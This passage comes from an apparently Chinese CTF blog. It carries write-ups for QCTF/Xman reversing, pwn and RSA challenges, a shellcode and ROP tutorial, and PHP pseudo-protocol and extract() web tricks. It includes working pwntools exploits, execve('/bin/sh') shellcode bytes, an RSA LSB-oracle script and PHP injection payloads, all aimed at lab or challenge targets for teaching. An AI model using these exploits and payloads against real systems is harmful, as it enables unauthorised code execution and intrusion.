&gt;&gt; 5); result = &amp;enc[i]; *result = 8 * *result | v3; return result;&#125; output()函数将密文输出到out中： 123456789101112int __fastcall output(char *enc, const char *file, int len)&#123; int v4; // [rsp+Ch] [rbp-24h] int i; // [rsp+28h] [rbp-8h] int fd; // [rsp+2Ch] [rbp-4h] v4 = len; fd = open(file, 65, 438LL); for ( i = 0; i &lt; v4; ++i ) write(fd, &amp;enc[i], 1uLL); return close(fd);&#125; 总体加密过程统计了that_girl文件的词频, 并将flag转换为对应的词频。经过两次加密, 置换, 移位。最后在尝试中写出最后的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env pythonf = open('out', 'rb')t = f.read()f.close()enc = []for i in range(len(t)): enc.append(ord(t[i]))print encflag = ''def convert(c): res = c - 10 if c == 10: res = c + 35 elif 32 &lt;= c &lt;= 34: res = c + 10 elif c == 39: res = c + 2 elif c == 44: res = c - 4 elif c == 46: res = c - 7 elif 58 &lt;= c &lt;= 59: res = c - 21 elif c == 63: res = c - 27 elif c == 95: res = c - 49 else: if c &lt;= 47 or c &gt; 57: if c &lt;= 64 or c &gt; 90: if c &gt; 96 and c &lt;= 122: res = c - 87 else: res = c - 55 else: res = c - 48 return res# convert1convert_map = &#123;&#125;for ch in range(256): convert_map[convert(ch)] = ch# print convert_mapf = open('that_girl', 'rb')that_girl = f.read()f.close()# print that_girlgirl = [0 for i in range(256)]for i in range(len(that_girl)): t = convert(that_girl[i]) girl[t * 4] += 1# print girl# shiftenc1 = []enc1.append(((enc[-1] &lt;&lt; 5) &amp; 0xff) | (enc[0] &gt;&gt; 3))for i in range(len(enc) - 1): enc1.append(((enc[i] &lt;&lt; 5) &amp; 0xff) | (enc[i + 1] &gt;&gt; 3))print len(enc1)table = [0x00000016, 0x00000000, 0x00000006, 0x00000002, 0x0000001E, 0x00000018, 0x00000009, 0x00000001, 0x00000015, 0x00000007, 0x00000012, 0x0000000A, 0x00000008, 0x0000000C, 0x00000011, 0x00000017, 0x0000000D, 0x00000004, 0x00000003, 0x0000000E, 0x00000013, 0x0000000B, 0x00000014, 0x00000010, 0x0000000F, 0x00000005, 0x00000019, 0x00000024, 0x0000001B, 0x0000001C, 0x0000001D, 0x00000025, 0x0000001F, 0x00000020, 0x00000021, 0x0000001A, 0x00000022, 0x00000023]print len(table)# convert2round_map = &#123;&#125;x = 0while table[x] != 0: round_map[table[x]] = x x = table[x]round_map[0] = 1print round_mapenc2 = [0 for i in range(len(enc1))]for origin, encoded in round_map.items(): enc2[origin] = enc1[encoded]for i in range(len(enc2)): for j in range(len(girl) / 4): if enc2[i] == girl[j * 4]: flag += chr(convert_map[j]) breakprint 'flag: QCTF&#123;%s&#125;' % flag ollvmPWNXman-dice_game放进ida看main函数： buf存在溢出，可以覆盖到seed，使之为0。想法就是通过爆破得到随机数的顺序。脚本： 1234567891011121314151617181920212223242526272829303132333435from pwn import *import randomimport timedef test(ans): p = process('./dice_game') # p = remote(\"47.96.239.28\", 9999) p.readuntil(\"name:\") payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0) p.sendline(payload) i = 0 ans_len = len(ans) log.success(ans) if True: while i &lt; ans_len: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n) random.seed(time.time()) n = str(int(random.randint(1, 6))) p.readuntil(\"nt(1~6): \") p.sendline(n) print(n) sub = p.readuntil('.') log.info(sub) return sub, nans = \"\"while(1): if len(ans) == 50: print(ans) break res, n = test(ans) if \"win\" in res: ans += n 通过得到的顺序作为payload，脚本： 1234567891011121314from pwn import *p = process('./dice_game')# p = remote(\"47.96.239.28\", 9999)p.readuntil(\"name:\")payload = p64(0x1122334455667788) * 8 + p64(0)p.sendline(payload)ans = \"25426251423232651155634433322261116425254446323361\"i = 0while i &lt; 50: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n)p.interactive() Xan-stack2感觉这应该算是一道比较好的栈溢出的题。checksec发现PIE没开，Canary和NX都开了。 拖进ida后f5： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); &#125; if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; 还能看到有一个hackhere函数，直接调用了system(&quot;/bin/bash&quot;)。 12345puts(\"which number to change:\");__isoc99_scanf(\"%d\", &amp;v5);puts(\"new number:\");__isoc99_scanf(\"%d\", &amp;v7);v13[v5] = v7; // index out of bound \b这里发现v5和v7没有做任何检查，能达到任意地址写。 所以这题的思路就是将main函数return地址覆盖为hackhere的地址。 基本就是ret到hackhere然后直接就成功了： 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859boffset = 132# gdb.attach(p, 'b *0x0804859b')for i in range(4): byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() 但发现远程没有bash，所以想到直接用字符串中的sh，即system(&amp;&quot;/bin/bash&quot;[7])，只需要找到字符串在栈上的位置： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859boffset = 132# gdb.attach(p, 'b *0x0804859b')# overflow retfor i in range(4): byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)str_addr = 0x08048987offset2 = offset + 8# point to string 'sh'for i in range(4): byte = (str_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset2 + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() CryptobabyRSA题目信息如下： 12345e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 最低有效位攻击了解一下。 对密文乘2^e(mod n)操作,再解密的时候，如果为偶数，说明明文再(0, n/2)之间，否则在(n/2, n)之间。这样，只需要log n的次数就可以知道明文。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'WARN'def num_to_bytes(n): b = hex(n)[2:].strip('L') b = '0' + b if len(b)%2 == 1 else b return b.decode('hex')e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0upper = nlower = 0k = 1while True: p = remote('47.96.239.28',23333) p.recvuntil('You can input ciphertext(hexdecimal) now\\n') power = pow(2, k, n) new_c = (pow(power, e, n) * c) % n new_c = hex(new_c)[2:].strip('L') p.sendline(new_c) data = p.recvline()[:-1] p.close() if data == \"even\": print 'Round %d: even' % k upper = (upper + lower) / 2 if data == \"odd\": print 'Round %d: odd' % k lower = (upper + lower) / 2 if data == \"error\": break if upper - lower &lt; 2: break k += 1flag = num_to_bytes(upper)[:-1]+'&#125;'print 'flag:', flag Xman-RSA拿到四个文件后，其中有一个很像python的脚本，通过对关键字等的判断，自己写脚本还原： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546l1 = &#123; 'a': 'd', 'b': 'm', 'd': 'e', 'e': 'n', 'f': 'w', 'g': 'f', 'h': 'o', 'i': 'x', 'j': 'g', 'k': 'p', 'l': 'y', 'm': 'h', 'p': 'i', 'q': 'r', 'r': 'a', 't': 's', 'u': 'b', 'v': 'k', 'w': 't', 'x': 'c', 'y': 'l', 'z': 'u'&#125;f = open('encryption.encrypted', 'r')ans = f.read()# print ansres = \"\"for ch in ans: flag = 0 for key, value in l1.items(): if ch == key: res += value flag = 1 break else: continue if flag == 1: continue else: res += chprint resraw_input()f = open('1.py', 'wb')f.write(res)f.close() 还原出原来的加密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b): return int(b.encode('hex'), 16) def num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b)%2 == 1 else b return b.decode('hex')def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num+=1 return numdef encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode('hex') def separate(n): p = n % 4 t = (p*p) % 4 return t == 1 f = open('flag.txt', 'r')flag = f.read() msg1 = \"\"msg2 = \"\"for i in range(len(flag)): if separate(i): # 奇数 msg2 += flag[i] else: # 偶数 msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1*p2n2 = p1*p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4*p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3))) 代码看完后，思路是先用共模攻击解出n1，之后利用公约数得到p1、p2、p3，再求出d1、d2，最后解出msg1、msg2。给出的文件中，ciphertext为第二次输出的c1和c2，，n1.encrypted为第二次输出的c1和c2，n2&amp;n3即最后输出的被加密后的n2和n3。解密脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env pythonimport base64import gmpy2f = open('n2&amp;n3', 'rb')n2 = f.readline()n3 = f.readline()f.close()n2 = base64.b64decode(n2).encode('hex')n3 = base64.b64decode(n3).encode('hex')n2 = int(n2, 16)n3 = int(n3, 16)# print 'n2:', n2# print 'n3:', n3# first step: solve n1e1 = 0x1001e2 = 0x101f = open('n1.encrypted', 'rb')n1_c1 = f.readline()n1_c2 = f.readline()f.close()n1_c1 = int(n1_c1, 16)n1_c2 = int(n1_c2, 16)# print 'n1_c1:', n1_c1# print 'n1_c2:', n1_c2gcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0: s = abs(s) n1_c1 = gmpy2.invert(n1_c1, n3)if t &lt; 0: t = abs(t) n1_c2 = gmpy2.invert(n1_c2, n3)n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3print 'n1:', n1# second step: solve flagf = open('ciphertext', 'rb')c1 = f.readline()c2 = f.readline()f.close()c1 = int(c1, 16)c2 = int(c2, 16)print 'c1:', c1print 'c2:', c2e = 0x1001p1 = gmpy2.gcd(n1, n2)p2 = n1 / p1p3 = n2 / p1d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))m1 = pow(c1, d1, n1)m2 = pow(c2, d2, n2)msg1 = hex(m1)[2:].decode('hex')msg2 = hex(m2)[2:].decode('hex')flag = ''for i in range(len(msg1 + msg2)): if i % 2 == 0: flag += msg1[i / 2] else: flag += msg2[i / 2]print 'flag:', flag 参考网站https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/https://www.xmsec.cc/stackoverflow-ropbasic/https://blog.csdn.net/xuchen16/article/details/81080580https://blog.csdn.net/xuchen16/article/details/81064079http://www.freebuf.com/column/177864.htmlhttps://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/http://www.cnblogs.com/semishigure/p/9318258.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"PWN入门（三）","slug":"PWN入门（三）","date":"2018-07-11T00:50:39.000Z","updated":"2019-02-28T07:35:52.118Z","comments":true,"path":"2018/07/11/PWN入门（三）/","link":"","permalink":"https://qianfei11.github.io/2018/07/11/PWN入门（三）/","excerpt":"Shellcode’s Magic&amp;Basic ROP.","text":"Shellcode’s Magic&amp;Basic ROP. shellcode是一段用于利用软件漏洞而执行的代码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 系统调用（int 0x80） NAME EAX EBX ECX EDX sys_exit 1 int 0 0 sys_read 3 unsigned int char * size_t sys_write 4 unsigned int const_char * size_t sys_open 5 const char * int int sys_execve 11 struct pt_regs 0 0 PS：最常用的为11号调用。也就是execve(&quot;/bin/sh&quot;,0,0)。 编写ShellCode自己编写shellcode的优点是灵活、可以随机应变。 坏字符Shellcode中存在0x00字节在进行利用的时候会被截断。Shellcode如果存储在堆或是栈的内存中，这样在shellcode执行时就不能出现0x00这样的阶段字符。 \\x00在执行MOV EAX,5时，相当于MOV EAX,0x00000005，即会产生0x00，可以使用MOV AL,5来绕过 \\x0A绕过可以通过!@#$%。 EBX中的参数（/bin/sh）一般做法是压入栈后取ESP： 123PUSH 0x68732F2FPUSH 0x6E69622FMOV EBX,ESP 前两段十六进制转换成ascii码是：hs//nib/，取ESP的值到EBX中后，EBX的值即为：字符串/bin//sh的首地址。 PS：在多级目录下，多个斜杠是对路径没有影响的。 nasm反汇编工具下载Netwide Assembler是一款基于英特尔x86架构的汇编与反汇编工具。它可以用来编写16位、32位（IA-32）和64位（x86-64）的程序。 NASM被认为是Linux平台上最受欢迎的汇编工具之一。 sudo apt-get install nasm报错记录一下无法下载时的解决方法。 使用ps -A | grep apt命令来找出所有apt进程。 使用sudo kill -9 {进程编号}来逐个杀死进程。 结束所有进程后即可下载。 完整编写过程写入文件shellcode.asm： 1234567891011Section .text global _start_start: xor ecx,ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx,esp mov al,0xb int 0x80 PS：关于这两条指令：XOR ECX,ECX =&gt; MUL ECX，经过测试，会先将ECX中的值置零，然后EAX、EDX中的值也都会变为零。 执行命令：nasm -f elf shellcode.asm -o shellcode.o后，使用objdump命令对shellcode.o进行反汇编：objdump -d shellcode.o。 将十六进制部分记录下来，就构成了一条shellcode：\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80。 ROP面向返回编程（Return-Oriented Programming）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。每一段gadget通常结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。 相关保护机制NX即No-eXecute（不可执行）的意思，NX（类似于windows下的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PS： No eXecute（NX） =&gt; linux Data Execution Prevention（DEP） =&gt; windows 也就是说：“可执行不可写，可写不可执行。” ASLRAddress Space Layout Randomization（地址空间布局随机化），该技术在2005年的kernel2.6.12中被引入到Linux系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前Linux、Windows等主流操作系统都已经采用该项技术。 分级： 0：没有随机化。即关闭ASLR。 1：保留的随机化。共享库、栈、mmap()以及VDSO将被随机化。 2：完全的随机化。在1的基础上，通过brk()分配的内存空间也将被随机化。 PS： ASLR并不负责BSS段、代码段（文本段）和数据段（DATA段）的随机化。 堆栈空间被完全随机化。 7-11源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; gets(buf); int magic = rand(); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; 这道题和之前的一题很类似，但是将buf和magic两个变量的位置进行了调换，所以无法通过直接覆盖magic的值来getshell。（当然还有一种方法时直接获得system(&quot;sh&quot;);的地址来getshell） 简单难度此时ASLR是关闭的。 基本的想法是先填入shellcode，然后通过ret的偏移量来跳转到shellcode的首地址，执行execve(&quot;/bin/sh&quot;,0,0)来getshell。 shellcode在之前已经写好了，偏移量也可以通过之前缓冲区溢出的方法来得到。 最后应该如何获得shellcode的首地址？可以通过如下payload来获取。 12345678910# test.pyfrom pwn import *p = process('./7-11')raw_input() # 相当于设下断点shellcode=p32(0xdeadbeef)+\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0x12345678)offset=116payload=shellcode+(offset-len(shellcode))*'A'+addrp.sendline(payload)p.interactive() 这里在shellcode前加上“0xdeadbeef”，是为了之后在调试时更方便地找到首地址。raw_input()要求输入值，可以使程序在运行时终止，相当于一个断点。 运行test.py，会得到该程序的PID，用gdb的attach命令执行它。 在运行程序处随便输入值，然后在gdb中用finish命令使程序执行到gets()函数结束，再用searchmem命令查找“0xdeadbeef”的地址，即得到shellcode的首地址。 最后的exp如下： 12345678910# 7-11.pyfrom pwn import *p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0xffffcfa8)offset=116# payload=shellcode+(offset-len(shellcode))*'A'+addrpayload=shellcode.ljust(offset,'A')+addrp.sendline(payload)p.interactive() 中等难度通过命令sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;，打开ASLR。 通过之前的了解，当ASLR开启时，堆栈的地址是随机的，而BSS的地址是不变的，那么通过BSS段可以做一些文章。 PS：BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。其特点是可读写，且在程序执行之前会自动清0。 总体的思路是利用BSS段地址不变的特性，构造payload：payload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)（因为BSS段开头部分可能存储一些重要数据，故增加0x100来避免影响程序）。第一个BSS首地址表示gets()的返回地址，第二个BSS首地址表示gets()的参数。 那么通过payload可知，程序执行时会重新返回到gets()函数处，调用函数时，相当于先Push retaddr再Jump，即第一个BSS首地址为函数返回地址，再输入shellcode作为函数参数，即第二个BSS首地址。 使用gdb对程序调试，用vmmap命令查看bss段： 记录下bss段地址。通过objdump -d查看gets()函数地址： 两个地址都搞定后，那么就可以写出exp了： 12345678910111213from pwn import *# p = remote('10.21.13.88',1025)p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"offset=116bss=0x0804a000gets_addr=0x08048400payload=offset*'A'+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)p.sendline(payload)# gdb.attach(p,'''# ''') //在运行脚本时可以直接打开gdb进行调试p.sendline(shellcode)p.interactive() pwnable.tw-startchecksec一下，发现保护都没开： 123456[*] &apos;/home/assassinq/Desktop/start&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 反编译出来只有_start和_exit，应该是个汇编程序。可以通过系统调用判断出调用的函数： 12345678910111213141516171819202122232425262728293031323334./start: file format elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060: 54 push esp 8048061: 68 9d 80 04 08 push 0x804809d 8048066: 31 c0 xor eax,eax 8048068: 31 db xor ebx,ebx 804806a: 31 c9 xor ecx,ecx 804806c: 31 d2 xor edx,edx 804806e: 68 43 54 46 3a push 0x3a465443 8048073: 68 74 68 65 20 push 0x20656874 8048078: 68 61 72 74 20 push 0x20747261 804807d: 68 73 20 73 74 push 0x74732073 8048082: 68 4c 65 74 27 push 0x2774654c 8048087: 89 e1 mov ecx,esp 8048089: b2 14 mov dl,0x14 804808b: b3 01 mov bl,0x1 804808d: b0 04 mov al,0x4 ; sys_write 804808f: cd 80 int 0x80 8048091: 31 db xor ebx,ebx 8048093: b2 3c mov dl,0x3c 8048095: b0 03 mov al,0x3 ; sys_read 8048097: cd 80 int 0x80 8048099: 83 c4 14 add esp,0x14 804809c: c3 ret 0804809d &lt;_exit&gt;: 804809d: 5c pop esp 804809e: 31 c0 xor eax,eax 80480a0: 40 inc eax 80480a1: cd 80 int 0x80 具体寄存器的值与系统调用的关系： 寄存器 作用 eax 中断类型号 ebx STDIN/STDOUT ecx 字符串地址 edx 字符串长度 因为栈是可执行的并且开启了ASLR。我们的想法就是通过泄漏栈地址，然后填入shellcode，跳转过去getshell。 exp如下： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./start')else: p = remote('139.162.123.119', 10000)write = 0x8048087# gdb.attach(p)offset = 20payload = 'A' * offset + p32(write)p.sendafter('CTF:', payload)stack = u32(p.recv(4)) + 0x10print 'stack:', hex(stack)sh = open('sh.bin').read()payload = 'A' * 20 + p32(stack + 4) + shp.send(payload)p.interactive() 参考网站https://linux.cn/article-8040-1.htmlhttp://bestwing.me/2017/03/19/stack-overflow-two-ROP/https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/https://blog.csdn.net/white_eyes/article/details/7169199https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/https://blog.csdn.net/Plus_RE/article/details/79199772http://showlinkroom.me/2017/01/22/pwnable-tw/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"WEB入门（五）","slug":"WEB入门（五）","date":"2018-07-10T09:10:35.000Z","updated":"2019-02-28T07:37:10.278Z","comments":true,"path":"2018/07/10/WEB入门（五）/","link":"","permalink":"https://qianfei11.github.io/2018/07/10/WEB入门（五）/","excerpt":"PHP伪协议和文件包含。","text":"PHP伪协议和文件包含。 PHP伪协议不是指网络上的TCP/IP协议，而是操作系统提供支持的一种协议，类似标准协议HTTP、FTP。自定义协议叫做伪协议。 伪协议格式：zzz://xxxxxx。 PHP伪协议总和 形式 作用 file:// 访问本地文件系统 http:// 访问 HTTP(s) 网址 ftp:// 访问 FTP(s) URLs php:// 访问各个输入/输出（I/Ostreams） zlib:// 压缩流 data:// 数据（RFC 2397） glob:// 查找匹配的文件路径模式 phar:// PHP 归档 ssh2:// Secure Shell 2 rar:// RAR ogg:// 音频流 expect:// 处理交互式的流 配置 allow_url_fopen：能否远程文件包含 allow_url_include：能否使用伪协议 PHP伪协议应用php://filter形式：?file=php://filter/convert.base64-encode/resource=xxx.php php://filter是一种元封装器，设计用于“数据流打开”时的“筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。 应用点击跳转页面后，通过伪协议读取源码： 源码解密后得到flag： 变量覆盖漏洞（extract()）int extract(array &amp;$var_array, int $extract_type = EXTR_OVERWRITE, string $prefix = null) extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 第二个参数type用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 extract(array,extract_rules,prefix) extract_rules的默认值为EXTR_OVERWRITE，表示如果有冲突，则覆盖已有的变量。 应用（lianxi-input1）源码： 123456789101112&lt;?php$flag='xxxxx'; extract($_GET); if(isset($shiyan)&#123; $content=trim($flag); if($shiyan==$content) echo'flag&#123;......&#125;'; else echo'Oh.no'; &#125;?&gt; 通过extract()变量覆盖，构造payload?shiyan=1&amp;flag=1得到flag。 file_get_contents()file_get_contents()函数把整个文件读入一个字符串中。 应用（lianxi-data）源码： 12345678&lt;?php$user=$_GET['user'];#echo $user;if(isset($user)&amp;&amp;(file_get_contents($user,'r')==='the user is admin')) echo \"flag&#123;xxxxxxxxxxxxx&#125;\";else echo \"you are not admin ! \";?&gt; 分别通过GET和POST两种方式获得flag： 应用四先根据提示查看php.ini配置情况 发现可以通过伪协议来执行代码，先获得根路径： 再通过scandir()函数来扫根路径就能找到flag路径，直接访问就得到flag。 eval()闭合漏洞eval()函数可以执行函数内部字符串所构成的指令。通过闭合前后的括号可以达到执行其他命令的效果。 应用（lianxi-excute）源码： 123456 